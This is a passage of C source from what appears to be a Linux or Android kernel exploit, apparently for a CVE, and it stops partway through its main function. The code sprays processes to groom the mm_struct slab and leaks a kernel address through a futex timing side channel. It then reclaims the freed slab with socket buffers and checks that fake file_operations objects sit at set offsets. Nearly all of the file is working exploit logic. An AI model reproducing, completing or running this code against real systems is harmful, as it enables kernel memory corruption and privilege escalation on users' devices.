/*
 * Prepares and reclaims an mm_struct slab. Pins allocations with child
 * processes, resolves a target address through the futex side channel, drains
 * selected objects, and fills reclaimed space with socket buffers.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "90_diagnostic_checkpoint.h"
#include "00_cpu_discovery.h"
#include "04_fake_kernel_objects.h"
#include "05_mm_slab_grooming.h"
#include "02_slab_cache_probe.h"

/* Debug instrumentation (H0): attribute the groom+install wall time to its
 * sub-phases (process spray, KernelSnitch collision search, bruteforce leak).
 * Prints to stderr only; no behavior change. */
static uint64_t groom_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

static void groom_dbg(const char *name, uint64_t t0, uint64_t *last) {
  uint64_t n = groom_now_ms();
  fprintf(stderr, "[groom] dbg phase=%s t=+%llums dt=%llums\n", name,
          (unsigned long long)(n - t0), (unsigned long long)(n - *last));
  *last = n;
}

static long groom_env_long_clamped(const char *name, long fallback, long lo,
                                    long hi) {
  const char *raw = getenv(name);
  if (!raw || !*raw) return fallback;
  errno = 0;
  char *end = NULL;
  long v = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || v < lo || v > hi) {
    return fallback;
  }
  return v;
}
#include "03_mm_address_sidechannel/mm_address_leak.h"

#define OSS_PAGE_SIZE 4096
#define OSS_MM_ORDER 3
#define OSS_MM_STRUCT_SZ 0x400
#define OSS_ORDER3_SIZE (OSS_PAGE_SIZE << OSS_MM_ORDER) /* 0x8000 */
#define OSS_SKB_SEND_SIZE FOPS_INSTALL_PAGE_SIZE         /* exact 0x8e80 */
#define OSS_MM_PARTIALS 5
#define OSS_KSNITCH_COLLISIONS 4
#define OSS_KSNITCH_REPEAT 64
#define OSS_KSNITCH_APPENDED_DEFAULT 512
#define OSS_SKB_RECLAIM_SENDS 64
#define OSS_SKB_RECLAIM_MIN_FULL 48
#define OSS_RECLAIM_QUIET_SAMPLE_MS 25
#define OSS_RECLAIM_QUIET_STREAK 3
#define OSS_RECLAIM_QUIET_MAX_SAMPLES 40
#define OSS_FACTORY_COMMAND_FD 198
#define OSS_FACTORY_READY_FD 199
#define OSS_FACTORY_READY_MAGIC 0x4d4d5244u
#define OSS_FACTORY_TIMEOUT_MS 10000
#define OSS_CRITICAL_FD_BASE 8192
#define OSS_CRITICAL_FD_MAX 96

#ifndef __NR_close_range
#define __NR_close_range 436
#endif

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct exec_factory_session {
  int command_pipe[2];
  int ready_pipe[2];
  pid_t worker;
  uint64_t started_ms;
  struct sigaction old_sigpipe;
  int sigpipe_guarded;
};

static int g_groom_cpu;

static int pin_cpu(int cpu);
static int pin_groom_cpu(void);

static void log_child_start_failure(const char *step, int error,
                                    int requested_cpu) {
  cpu_set_t allowed;
  CPU_ZERO(&allowed);
  int affinity_ok = sched_getaffinity(0, sizeof(allowed), &allowed) == 0;
  fprintf(stderr,
          "[groom-child] start failed step=%s pid=%d ppid=%d cpu=%d "
          "errno=%d affinity_cpu=%d affinity_ok=%d affinity_allowed=%d\n",
          step, getpid(), getppid(), sched_getcpu(), error, requested_cpu,
          affinity_ok,
          affinity_ok && CPU_ISSET(requested_cpu, &allowed));
}

static pid_t clone_child(int cpu) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0) {
      log_child_start_failure("pdeathsig", errno, cpu);
      _exit(100);
    }
    if (getppid() == 1) {
      log_child_start_failure("orphaned", 0, cpu);
      _exit(101);
    }

    if (pin_cpu(cpu) != 0) {
      log_child_start_failure("affinity", errno, cpu);
      _exit(102);
    }
    for (;;) {
      pause();
    }
  }
  return child;
}

static struct kernelsnitch_shared_state *g_ks;
static struct kernelsnitch_shared_state *g_ks_verify;

static pid_t clone_leak_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0) {
      log_child_start_failure("leak-pdeathsig", errno, g_groom_cpu);
      _exit(110);
    }
    if (getppid() == 1) {
      log_child_start_failure("leak-orphaned", 0, g_groom_cpu);
      _exit(111);
    }
    if (pin_groom_cpu() != 0) {
      log_child_start_failure("leak-affinity", errno, g_groom_cpu);
      _exit(112);
    }
    /* One pile + one scan feeds both oracles with disjoint collision subsets,
     * replacing two serial pile/scan passes. Both still bruteforce
     * independently and must agree on the aligned mm_struct below. */
    kernelsnitch_find_collisions_parallel_dual(g_ks, g_ks_verify);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return open(path, O_RDONLY);
}

static int diagnostic_status_line(const char *line) {
  static const char *const fields[] = {
      "Name:",       "State:",      "Tgid:",       "Pid:",
      "PPid:",       "TracerPid:",  "Uid:",        "Gid:",
      "Threads:",    "CoreDumping:", "NoNewPrivs:", "Seccomp:",
      "Cpus_allowed:", "Cpus_allowed_list:",
  };
  for (size_t i = 0; i < sizeof(fields) / sizeof(fields[0]); i++) {
    if (strncmp(line, fields[i], strlen(fields[i])) == 0) return 1;
  }
  return 0;
}

static void diagnose_proc_file(pid_t child, const char *name) {
  char path[80];
  snprintf(path, sizeof(path), "/proc/%d/%s", child, name);
  FILE *file = fopen(path, "re");
  if (!file) {
    fprintf(stderr,
            "[groom] memfd diag file=%s pid=%d open_errno=%d\n", name,
            child, errno);
    return;
  }
  char line[256];
  while (fgets(line, sizeof(line), file)) {
    size_t length = strlen(line);
    while (length > 0 && (line[length - 1] == '\n' ||
                          line[length - 1] == '\r')) {
      line[--length] = '\0';
    }
    if (strcmp(name, "status") != 0 || diagnostic_status_line(line)) {
      fprintf(stderr, "[groom] memfd diag file=%s pid=%d value=%s\n", name,
              child, line);
    }
  }
  fclose(file);
}

static void diagnose_memfd_failure(const char *phase, size_t index,
                                   pid_t child, int open_error) {
  int alive = kill(child, 0);
  int alive_error = alive == 0 ? 0 : errno;
  siginfo_t info;
  memset(&info, 0, sizeof(info));
  int wait_result = waitid(P_PID, (id_t)child, &info,
                           WEXITED | WNOHANG | WNOWAIT);
  int wait_error = wait_result == 0 ? 0 : errno;
  cpu_set_t affinity;
  CPU_ZERO(&affinity);
  int affinity_result = sched_getaffinity(child, sizeof(affinity), &affinity);
  int affinity_error = affinity_result == 0 ? 0 : errno;
  fprintf(stderr,
          "[groom] memfd diag phase=%s index=%zu pid=%d open_errno=%d "
          "alive=%d alive_errno=%d wait=%d wait_errno=%d wait_pid=%d "
          "wait_code=%d wait_status=%d affinity=%d affinity_errno=%d "
          "parent_pid=%d parent_cpu=%d parent_dumpable=%d groom_cpu=%d\n",
          phase, index, child, open_error, alive == 0, alive_error,
          wait_result, wait_error, info.si_pid, info.si_code, info.si_status,
          affinity_result, affinity_error, getpid(), sched_getcpu(),
          prctl(PR_GET_DUMPABLE), g_groom_cpu);
  diagnose_proc_file(child, "status");
  diagnose_proc_file(child, "stat");
  diagnose_proc_file(child, "attr/current");
  diagnose_proc_file(child, "cgroup");
  errno = open_error;
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
    return;
  }
  while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
  }
}

static int init_ctx(struct mm_ctx *ctx, size_t cnt) {
  memset(ctx, 0, sizeof(*ctx));
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
  if (!ctx->childs || !ctx->memfds) {
    free(ctx->childs);
    free(ctx->memfds);
    memset(ctx, 0, sizeof(*ctx));
    return 0;
  }
  for (size_t i = 0; i < cnt; i++) {
    ctx->childs[i] = -1;
    ctx->memfds[i] = -1;
  }
  return 1;
}

static void cleanup_ctx(struct mm_ctx *ctx) {
  if (!ctx) {
    return;
  }
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds && ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
    if (ctx->childs && ctx->childs[i] > 0) {
      kill_child(ctx->childs[i]);
      ctx->childs[i] = -1;
    }
  }
  free(ctx->childs);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

static void release_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

static void raise_rlimit_to_max_best_effort(int resource) {
  struct rlimit rl;
  if (getrlimit(resource, &rl) == 0) {
    rl.rlim_cur = rl.rlim_max;
    setrlimit(resource, &rl);
  }
}

void groom_set_cpu(int cpu) {
  g_groom_cpu = cpu;
}

static int pin_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  return sched_setaffinity(0, sizeof(set), &set);
}

static int pin_groom_cpu(void) {
  return pin_cpu(g_groom_cpu);
}

static int pin_and_validate_groom_cpu(void) {
  return cpu_discovery_pin_and_validate(g_groom_cpu, NULL) ? 0 : -1;
}

static int prepare_close_range_batch(int **sources, size_t count,
                                     int *first_fd, int *last_fd) {
  if (!sources || count == 0 || count > OSS_CRITICAL_FD_MAX) return 0;
  struct rlimit limit;
  if (getrlimit(RLIMIT_NOFILE, &limit) != 0 ||
      limit.rlim_cur <= (rlim_t)(OSS_CRITICAL_FD_BASE + count)) {
    return 0;
  }
  for (size_t i = 0; i < count; i++) {
    int target = OSS_CRITICAL_FD_BASE + (int)i;
    errno = 0;
    if (!sources[i] || *sources[i] < 0 ||
        fcntl(target, F_GETFD) != -1 || errno != EBADF) {
      return 0;
    }
  }
  size_t duplicated = 0;
  for (; duplicated < count; duplicated++) {
    int target = OSS_CRITICAL_FD_BASE + (int)duplicated;
    if (dup3(*sources[duplicated], target, O_CLOEXEC) != target) break;
  }
  if (duplicated != count) {
    for (size_t i = 0; i < duplicated; i++) {
      close(OSS_CRITICAL_FD_BASE + (int)i);
    }
    return 0;
  }
  for (size_t i = 0; i < count; i++) {
    close(*sources[i]);
    *sources[i] = -1;
  }
  *first_fd = OSS_CRITICAL_FD_BASE;
  *last_fd = OSS_CRITICAL_FD_BASE + (int)count - 1;
  return 1;
}

static int close_range_batch(int first_fd, int last_fd) {
  if (first_fd < 0 || last_fd < first_fd) return 0;
  return syscall(__NR_close_range, (unsigned int)first_fd,
                 (unsigned int)last_fd, 0) == 0;
}

static int read_exact(int fd, void *buffer, size_t length) {
  unsigned char *cursor = buffer;
  while (length > 0) {
    ssize_t count = read(fd, cursor, length);
    if (count < 0 && errno == EINTR) continue;
    if (count <= 0) return 0;
    cursor += count;
    length -= (size_t)count;
  }
  return 1;
}

static int write_exact(int fd, const void *buffer, size_t length) {
  const unsigned char *cursor = buffer;
  while (length > 0) {
    ssize_t count = write(fd, cursor, length);
    if (count < 0 && errno == EINTR) continue;
    if (count <= 0) return 0;
    cursor += count;
    length -= (size_t)count;
  }
  return 1;
}

static int install_factory_fd(int source, int target) {
  if (source == target) return fcntl(source, F_SETFD, 0) == 0;
  return dup3(source, target, 0) == target;
}

static int factory_session_start(struct exec_factory_session *session,
                                 const char *factory_path) {
  memset(session, 0, sizeof(*session));
  session->command_pipe[0] = -1;
  session->command_pipe[1] = -1;
  session->ready_pipe[0] = -1;
  session->ready_pipe[1] = -1;
  session->worker = -1;
  session->started_ms = groom_now_ms();
  struct sigaction ignore_sigpipe;
  memset(&ignore_sigpipe, 0, sizeof(ignore_sigpipe));
  ignore_sigpipe.sa_handler = SIG_IGN;
  sigemptyset(&ignore_sigpipe.sa_mask);
  if (sigaction(SIGPIPE, &ignore_sigpipe, &session->old_sigpipe) != 0) {
    fprintf(stderr, "[groom] exec factory SIGPIPE guard failed errno=%d\n",
            errno);
    return 0;
  }
  session->sigpipe_guarded = 1;

  if (pipe2(session->command_pipe, O_CLOEXEC) != 0 ||
      pipe2(session->ready_pipe, O_CLOEXEC) != 0) {
    fprintf(stderr, "[groom] exec factory pipe failed errno=%d\n", errno);
    return 0;
  }

  session->worker = fork();
  if (session->worker < 0) {
    fprintf(stderr, "[groom] exec factory fork failed errno=%d\n", errno);
    return 0;
  }
  if (session->worker == 0) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0) {
      log_child_start_failure("factory-pdeathsig", errno, g_groom_cpu);
      _exit(120);
    }
    if (getppid() == 1) {
      log_child_start_failure("factory-orphaned", 0, g_groom_cpu);
      _exit(121);
    }
    if (pin_groom_cpu() != 0) {
      log_child_start_failure("factory-affinity", errno, g_groom_cpu);
      _exit(122);
    }
    if (!install_factory_fd(session->command_pipe[0], OSS_FACTORY_COMMAND_FD) ||
        !install_factory_fd(session->ready_pipe[1], OSS_FACTORY_READY_FD)) {
      log_child_start_failure("factory-fds", errno, g_groom_cpu);
      _exit(123);
    }
    for (size_t i = 0; i < 2; i++) {
      if (session->command_pipe[i] != OSS_FACTORY_COMMAND_FD &&
          session->command_pipe[i] != OSS_FACTORY_READY_FD) {
        close(session->command_pipe[i]);
      }
      if (session->ready_pipe[i] != OSS_FACTORY_COMMAND_FD &&
          session->ready_pipe[i] != OSS_FACTORY_READY_FD) {
        close(session->ready_pipe[i]);
      }
    }
    char *const argv[] = {(char *)factory_path, NULL};
    char *const envp[] = {NULL};
    execve(factory_path, argv, envp);
    log_child_start_failure("factory-execve", errno, g_groom_cpu);
    _exit(124);
  }

  close(session->command_pipe[0]);
  session->command_pipe[0] = -1;
  close(session->ready_pipe[1]);
  session->ready_pipe[1] = -1;
  return 1;
}

static int factory_session_affinity_ok(
    const struct exec_factory_session *session) {
  cpu_set_t allowed;
  CPU_ZERO(&allowed);
  return session->worker > 0 &&
         sched_getaffinity(session->worker, sizeof(allowed), &allowed) == 0 &&
         CPU_COUNT(&allowed) == 1 && CPU_ISSET(g_groom_cpu, &allowed);
}

static int factory_session_next(struct exec_factory_session *session,
                                const char *phase, size_t index,
                                int *memfd_out) {
  uint32_t magic = 0;
  uint64_t elapsed = groom_now_ms() - session->started_ms;
  int remaining = elapsed < OSS_FACTORY_TIMEOUT_MS
                      ? OSS_FACTORY_TIMEOUT_MS - (int)elapsed
                      : 0;
  struct pollfd ready = {.fd = session->ready_pipe[0], .events = POLLIN};
  int polled;
  do {
    polled = poll(&ready, 1, remaining);
  } while (polled < 0 && errno == EINTR);
  if (polled != 1 || !(ready.revents & POLLIN) ||
      !read_exact(session->ready_pipe[0], &magic, sizeof(magic)) ||
      magic != OSS_FACTORY_READY_MAGIC || !factory_session_affinity_ok(session)) {
    fprintf(stderr,
            "[groom] exec factory handshake failed phase=%s index=%zu "
            "magic=%08x poll=%d revents=%x affinity=%d errno=%d\n",
            phase, index, magic, polled, ready.revents,
            factory_session_affinity_ok(session), errno);
    return 0;
  }
  *memfd_out = open_memfd(session->worker);
  if (*memfd_out < 0) {
    int open_error = errno;
    fprintf(stderr,
            "[groom] exec factory memfd failed phase=%s index=%zu errno=%d\n",
            phase, index, open_error);
    diagnose_memfd_failure(phase, index, session->worker, open_error);
    return 0;
  }
  return 1;
}

static int factory_session_advance(struct exec_factory_session *session,
                                   const char *phase, size_t index) {
  const unsigned char command = 1;
  if (write_exact(session->command_pipe[1], &command, sizeof(command))) {
    return 1;
  }
  fprintf(stderr,
          "[groom] exec factory command failed phase=%s index=%zu errno=%d\n",
          phase, index, errno);
  return 0;
}

static int factory_session_stop(struct exec_factory_session *session) {
  int ok = 1;
  if (session->worker > 0) kill_child(session->worker);
  session->worker = -1;
  for (size_t i = 0; i < 2; i++) {
    if (session->command_pipe[i] >= 0) close(session->command_pipe[i]);
    if (session->ready_pipe[i] >= 0) close(session->ready_pipe[i]);
    session->command_pipe[i] = -1;
    session->ready_pipe[i] = -1;
  }
  if (session->sigpipe_guarded &&
      sigaction(SIGPIPE, &session->old_sigpipe, NULL) != 0) {
    fprintf(stderr, "[groom] exec factory SIGPIPE restore failed errno=%d\n",
            errno);
    ok = 0;
  }
  session->sigpipe_guarded = 0;
  return ok;
}

static int fill_prepare_with_exec_factory(struct mm_ctx *ctx,
                                          const char *factory_path) {
  struct exec_factory_session session;
  if (!factory_session_start(&session, factory_path)) {
    factory_session_stop(&session);
    return 0;
  }
  int ok = 1;

  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (!factory_session_next(&session, "prepare", i, &ctx->memfds[i]) ||
        (i + 1 < ctx->mm_cnt &&
         !factory_session_advance(&session, "prepare", i))) {
      ok = 0;
      break;
    }
  }
  uint64_t elapsed = groom_now_ms() - session.started_ms;
  if (!factory_session_stop(&session)) ok = 0;
  if (ok) {
    fprintf(stderr,
            "[groom] exec factory ready objects=%zu cpu=%d elapsed=%llums\n",
            ctx->mm_cnt, g_groom_cpu, (unsigned long long)elapsed);
  }
  return ok;
}

static int fill_critical_with_exec_factory(
    struct mm_ctx *pre_ctx, struct mm_ctx *post_ctx, const char *factory_path,
    pid_t *leak_child_out, int *leak_memfd_out) {
  struct exec_factory_session session;
  if (!factory_session_start(&session, factory_path)) {
    factory_session_stop(&session);
    return 0;
  }
  int ok = 1;
  for (size_t i = 0; i < pre_ctx->mm_cnt; i++) {
    if (!factory_session_next(&session, "critical-pre", i,
                              &pre_ctx->memfds[i]) ||
        (i + 1 < pre_ctx->mm_cnt &&
         !factory_session_advance(&session, "critical-pre", i))) {
      ok = 0;
      break;
    }
  }
  if (ok) {
    *leak_child_out = clone_leak_child();
    if (*leak_child_out < 0) {
      fprintf(stderr, "[groom] leak clone failed errno=%d\n", errno);
      ok = 0;
    }
  }
  if (ok) {
    *leak_memfd_out = open_memfd(*leak_child_out);
    if (*leak_memfd_out < 0) {
      int open_error = errno;
      fprintf(stderr, "[groom] leak memfd failed errno=%d\n", open_error);
      diagnose_memfd_failure("leak", 0, *leak_child_out, open_error);
      ok = 0;
    }
  }
  if (ok &&
      !factory_session_advance(&session, "critical-target", pre_ctx->mm_cnt)) {
    ok = 0;
  }
  for (size_t i = 0; ok && i < post_ctx->mm_cnt; i++) {
    if (!factory_session_next(&session, "critical-post", i,
                              &post_ctx->memfds[i]) ||
        (i + 1 < post_ctx->mm_cnt &&
         !factory_session_advance(&session, "critical-post", i))) {
      ok = 0;
    }
  }
  uint64_t elapsed = groom_now_ms() - session.started_ms;
  if (!factory_session_stop(&session)) ok = 0;
  if (ok) {
    fprintf(stderr,
            "[groom] critical exec factory pre=%zu target=1 post=%zu cpu=%d "
            "elapsed=%llums\n",
            pre_ctx->mm_cnt, post_ctx->mm_cnt, g_groom_cpu,
            (unsigned long long)elapsed);
  }
  return ok;
}

static uint64_t load_u64(const unsigned char *buf, size_t off) {
  uint64_t value;
  memcpy(&value, buf + off, sizeof(value));
  return value;
}

static uint64_t fops_object_fingerprint(const unsigned char *buf) {
  uint64_t hash = 1469598103934665603ULL;
  for (size_t i = 0; i < FOPS_INSTALL_PAGE_SIZE; i++) {
    hash ^= buf[i];
    hash *= 1099511628211ULL;
  }
  return hash;
}

static int validate_fops_object(const unsigned char *buf,
                                uint64_t aligned_base) {
  return load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET) == 0 &&
         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 8) ==
             (aligned_base | 0x14e8ULL) &&
         load_u64(buf, OSS_RECOVERY_FOPS_BUFFER_OFFSET) == 0 &&
         load_u64(buf, OSS_RECOVERY_FOPS_BUFFER_OFFSET + 8) ==
             (aligned_base | 0x14e8ULL) &&
         memcmp(buf + OSS_PRIMARY_FOPS_BUFFER_OFFSET,
                buf + OSS_RECOVERY_FOPS_BUFFER_OFFSET,
                OSS_FAKE_FOPS_POPULATED_SIZE) == 0 &&
         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x20) != 0 &&
         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x28) != 0 &&
         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x50) != 0 &&
         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x70) != 0 &&
         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x80) != 0 &&
         load_u64(buf, 0x2218) == (aligned_base | 0x14d0ULL) &&
         load_u64(buf, 0x2220) == (aligned_base | 0x14d0ULL) &&
         load_u64(buf, 0x2228) == 1;
}

static int validate_mm_candidate(uint64_t leaked, uint64_t *aligned_base,
                                 size_t *object_index) {
  if (leaked < KERNELSNITCH_IDENTITY_START ||
      leaked >= KERNELSNITCH_IDENTITY_END ||
      (leaked & (OSS_MM_STRUCT_SZ - 1)) != 0) {
    return 0;
  }
  uint64_t base = leaked & ~(uint64_t)(OSS_ORDER3_SIZE - 1);
  size_t index = (size_t)((leaked - base) / OSS_MM_STRUCT_SZ);
  if ((base & (OSS_ORDER3_SIZE - 1)) != 0 || index >= 32) {
    return 0;
  }
  *aligned_base = base;
  *object_index = index;
  return 1;
}

struct reclaim_slab_snapshot {
  struct mm_slabinfo mm;
  struct mm_slabinfo skb;
  struct mm_slabinfo kmalloc4k;
};

static int read_reclaim_slabs(struct reclaim_slab_snapshot *out) {
  return read_named_slabinfo("mm_struct", &out->mm) &&
         read_named_slabinfo("skbuff_head_cache", &out->skb) &&
         read_named_slabinfo("kmalloc-4k", &out->kmalloc4k);
}

static int slab_activity_equal(const struct mm_slabinfo *a,
                               const struct mm_slabinfo *b) {
  return a->active_objs == b->active_objs && a->num_objs == b->num_objs &&
         a->active_slabs == b->active_slabs &&
         a->num_slabs == b->num_slabs;
}

static int reclaim_slabs_equal(const struct reclaim_slab_snapshot *a,
                               const struct reclaim_slab_snapshot *b) {
  return slab_activity_equal(&a->mm, &b->mm) &&
         slab_activity_equal(&a->skb, &b->skb) &&
         slab_activity_equal(&a->kmalloc4k, &b->kmalloc4k);
}

static int wait_for_reclaim_quiet_window(
    int *samples_out, struct reclaim_slab_snapshot *stable_out) {
  struct reclaim_slab_snapshot previous;
  if (!read_reclaim_slabs(&previous)) {
    return 0;
  }
  int streak = 0;
  for (int sample = 1; sample <= OSS_RECLAIM_QUIET_MAX_SAMPLES; sample++) {
    struct timespec delay = {
        .tv_sec = 0,
        .tv_nsec = OSS_RECLAIM_QUIET_SAMPLE_MS * 1000L * 1000L,
    };
    while (nanosleep(&delay, &delay) != 0 && errno == EINTR) {
    }
    struct reclaim_slab_snapshot current;
    if (!read_reclaim_slabs(&current)) {
      return 0;
    }
    streak = reclaim_slabs_equal(&previous, &current) ? streak + 1 : 0;
    previous = current;
    if (streak >= OSS_RECLAIM_QUIET_STREAK) {
      *samples_out = sample;
      if (stable_out) *stable_out = current;
      fprintf(stderr,
              "[groom] reclaim quiet pass samples=%d streak=%d "
              "mm=%lu/%lu skb=%lu/%lu kmalloc4k=%lu/%lu\n",
              sample, streak, current.mm.active_objs, current.mm.num_objs,
              current.skb.active_objs, current.skb.num_objs,
              current.kmalloc4k.active_objs, current.kmalloc4k.num_objs);
      return 1;
    }
  }
  *samples_out = OSS_RECLAIM_QUIET_MAX_SAMPLES;
  return 0;
}

static int exact_mm_reclaim(const struct mm_slabinfo *before,
                            const struct mm_slabinfo *after,
                            unsigned long released_refs) {
  long long active_drop = (long long)before->active_objs -
                          (long long)after->active_objs;
  long long object_drop =
      (long long)before->num_objs - (long long)after->num_objs;
  long long active_slab_drop = (long long)before->active_slabs -
                               (long long)after->active_slabs;
  long long slab_drop =
      (long long)before->num_slabs - (long long)after->num_slabs;
  int pass = object_drop == OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ &&
             active_slab_drop == 1 && slab_drop == 1;
  fprintf(stderr,
          "[groom] exact reclaim active_drop=%lld/%lu object_drop=%lld/32 "
          "active_slab_drop=%lld/1 slab_drop=%lld/1 pass=%d\n",
          active_drop, released_refs, object_drop, active_slab_drop,
          slab_drop, pass);
  return pass;
}

static uint64_t groom_and_install_fops_object_impl(
    uint64_t kernel_base, uint64_t ashmem_misc_fops_addr,
    uint64_t init_task_addr) {
  raise_rlimit_to_max_best_effort(RLIMIT_NOFILE);
  raise_rlimit_to_max_best_effort(RLIMIT_NPROC);

  const char *factory_path = getenv("CVE43499_MM_FACTORY");
  if (!factory_path || factory_path[0] != '/') {
    fprintf(stderr, "[groom] exec factory path missing\n");
    return 0;
  }

  uint64_t dbg_t0 = groom_now_ms();
  uint64_t dbg_last = dbg_t0;

  size_t mm_objs_per_slab = OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ; /* 32 */

  struct mm_ctx prepare_ctx = {0}, spray_ctx = {0}, pre_ctx = {0},
                post_ctx = {0};
  unsigned char *skb_buf = NULL;
  pid_t child_leak = -1;
  int memfd_leak = -1;
  int reclaim_sv[2] = {-1, -1};
  int pcp_sv[2] = {-1, -1};
  uint64_t result = 0;

  if (!init_ctx(&prepare_ctx, 32 * mm_objs_per_slab) || /* 1024 */
      !init_ctx(&spray_ctx,
                (1 + OSS_MM_PARTIALS) * mm_objs_per_slab) || /* 192 */
      !init_ctx(&pre_ctx, mm_objs_per_slab - 1) ||            /* 31 */
      !init_ctx(&post_ctx, mm_objs_per_slab)) {               /* 32 */
    fprintf(stderr, "[groom] context allocation failed\n");
    goto cleanup;
  }

  skb_buf = malloc(OSS_SKB_SEND_SIZE);
  if (!skb_buf) {
    fprintf(stderr, "[groom] skb buffer allocation failed\n");
    goto cleanup;
  }
  memset(skb_buf, 0x41, OSS_SKB_SEND_SIZE);

  if (!fill_prepare_with_exec_factory(&prepare_ctx, factory_path)) {
    goto cleanup;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child(g_groom_cpu);
    if (spray_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] spray clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
    if (spray_ctx.memfds[i] < 0) {
      int open_error = errno;
      fprintf(stderr, "[groom] spray memfd failed index=%zu errno=%d\n", i,
              open_error);
      diagnose_memfd_failure("spray", i, spray_ctx.childs[i], open_error);
      goto cleanup;
    }
  }

  groom_dbg("proc-spray-done", dbg_t0, &dbg_last); /* prepare 1024 + spray 192 */

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (cpu_count <= 0) {
    fprintf(stderr, "[groom] invalid online CPU count=%d\n", cpu_count);
    goto cleanup;
  }
  g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
                            OSS_KSNITCH_COLLISIONS, 0, 0);
  g_ks_verify = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
                                   OSS_KSNITCH_COLLISIONS, 0, 0);
  if (!g_ks || !g_ks_verify) {
    fprintf(stderr, "[groom] kernelsnitch dual setup failed\n");
    goto cleanup;
  }
  if (pin_and_validate_groom_cpu() != 0) {
    fprintf(stderr, "[groom] CPU-%d critical pin failed errno=%d\n",
            g_groom_cpu, errno);
    goto cleanup;
  }
  fprintf(stderr,
          "[groom] bulk cpu=%d; critical create/free/reclaim cpu=%d\n",
          g_groom_cpu, sched_getcpu());
  {
    /* Keep the established repeat count. The smaller waiter pile was
     * measured in the isolated reference collision benchmark. */
    long ks_appended = groom_env_long_clamped(
        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256,
        APPENDED_FUTEXES);
    long ks_repeat = groom_env_long_clamped(
        "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT, OSS_KSNITCH_REPEAT,
        REPEAT_MEASUREMENT);
    kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
                              g_ks->average);
    kernelsnitch_set_profile(g_ks_verify, (size_t)ks_appended,
                              (size_t)ks_repeat, g_ks_verify->average);
    fprintf(stderr,
            "[groom] ksnitch profile oracles=2 appended=%zu repeat=%zu "
            "average=%zu confirmations=%zu\n",
            g_ks->appended_futexes, g_ks->repeat_measurement, g_ks->average,
            g_ks->collision_confirmations);
  }
  groom_dbg("ksnitch-setup", dbg_t0, &dbg_last);

  if (!fill_critical_with_exec_factory(&pre_ctx, &post_ctx, factory_path,
                                       &child_leak, &memfd_leak)) {
    goto cleanup;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = -1;
  }
  pid_t leak_waited;
  do {
    leak_waited = waitpid(child_leak, NULL, 0);
  } while (leak_waited < 0 && errno == EINTR);
  if (leak_waited != child_leak) {
    fprintf(stderr, "[groom] leak child wait failed errno=%d\n", errno);
    goto cleanup;
  }
  child_leak = -1;
  groom_dbg("find-collisions-done", dbg_t0, &dbg_last); /* 4096-thread append + scan */

  int primary_collisions = kernelsnitch_found_collisions(g_ks);
  int verify_collisions = kernelsnitch_found_collisions(g_ks_verify);
  fprintf(stderr,
          "[groom] ksnitch oracle=primary baseline=%zu threshold=%zu "
          "min=%zu confirmed=%zu pass=%d\n",
          g_ks->collision_baseline, g_ks->collision_threshold,
          g_ks->collision_min_time, g_ks->confirmed_collisions,
          primary_collisions);
  fprintf(stderr,
          "[groom] ksnitch oracle=verify baseline=%zu threshold=%zu "
          "min=%zu confirmed=%zu pass=%d\n",
